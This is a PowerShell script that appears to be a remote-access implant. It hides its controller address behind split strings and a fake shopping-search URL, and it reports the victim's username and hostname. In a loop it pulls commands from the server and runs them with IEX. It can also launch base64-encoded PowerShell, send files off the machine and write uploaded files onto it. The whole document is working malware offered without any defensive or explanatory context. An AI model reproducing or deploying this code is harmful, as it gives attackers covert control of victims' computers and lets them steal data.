$h0 = "172.16"
$me = ".71.1"
$p0rt= "8080"
$uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
$proto = "ht"+"tp"+":/"+"/"
$url = $proto+$h0+$me+":"+$p0rt
$h0me = $url+$uri

$type = "ps1"
$id = Get-Random
$un = $env:username
$hn = $env:computername
$sleepytime = 3000
$jsObject = @{}

$useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
$checkin = "{`"p`":[ {`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`"} ] }"

function ConvertTo-Hashtable {
  [CmdletBinding()]
  [OutputType('hashtable')]
  param (
    [Parameter(ValueFromPipeline)]
     $InputObject
  )

  process {
    if ($null -eq $InputObject) {
      return $null
    }
    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
      $collection = @(
        foreach ($object in $InputObject) {
          ConvertTo-Hashtable -InputObject $object
        }
      )

      Write-Output -NoEnumerate $collection
    }

    elseif ($InputObject -is [psobject]) {
      $hash = @{}
      foreach ($property in $InputObject.PSObject.Properties) {
        $hash[$property.Name] = ConvertTo-Hashtable -InputObject $property.Value
      }
      $hash
    }
    else {
      $InputObject
    }
  }
}

while ($True) {
	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
	$jsondata = "{" + ($serverMsg.split("{")[1..99] -join "{").split("`n")[0]
	$jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable


	if($jsObject['p'][0]['cmnd']) {
		$rettype = "retval" #Default
		$binary = $false
                $cmnd = $jsObject['p'][0]['cmnd']
	
		if($cmnd -eq "quit") {
			exit
		}

		if($cmnd.split(" ")[0] -eq "spawn") {
			try {
				$selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmnd.split(" ")[1]))
				$selfdata = $selfdata.replace('"','"""')
				Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
				$retval = "[+] Spawn success..."
			}
			catch {
				$retval = "[-] Spawn failed..."
			}
		}

		elseif($cmnd.split(" ")[0] -eq "psh" -or $cmnd.split(" ")[0] -eq "cs" -or $cmnd.split(" ")[0] -eq "shc") {
			$psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmnd.split(" ")[1]))
			$retval = IEX $psdata -ErrorVariable err 2>&1
			if($err) {
				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
				$err = ""
			}
		}
		
		elseif($cmnd.split(" ")[0] -eq "dl") {
			$filepath = $cmnd.split(" ")[1..99] -join " "
			if(Test-Path $filepath) {
				$filepath = Resolve-Path $filepath
				$retval = [System.IO.File]::ReadAllBytes($filepath)
				$rettype = "dl"
				$binary = $true
			}
			else {
				$retval = "[!] Could not read file: $filepath"
			}
		}

		elseif($cmnd.split(" ")[0] -eq "up") {
			try {
				$filepath = $cmnd.split(" ")[2..99] -join " "
				$content = [Convert]::FromBase64String($cmnd.split(" ")[1])
				[IO.File]::WriteAllBytes($filepath, $content)
				$retval = "[*] File uploaded: $filepath"
			}
			catch {
				$retval = "[-] Could not upload file: $filepath"
			}
		}

		else {
			$retval = IEX $cmnd -ErrorVariable err 2>&1
			if($err) {
				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
				$err = ""
			}
		}

		if(!($retval)) {
			$retval = "[*] No output returned"
		}
		
		if($binary) { #Binary data
			$ncoded = [Convert]::ToBase64String($retval)
		}
		else { # String data
			$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
		}
		$jsObject.cmnd = ""
		$cmnd = ""

		$resp = "{`"p`":[ {`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`", `"$rettype`": `"$ncoded`"} ] }"
		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
	}
	Start-Sleep -Milliseconds $sleepytime
}

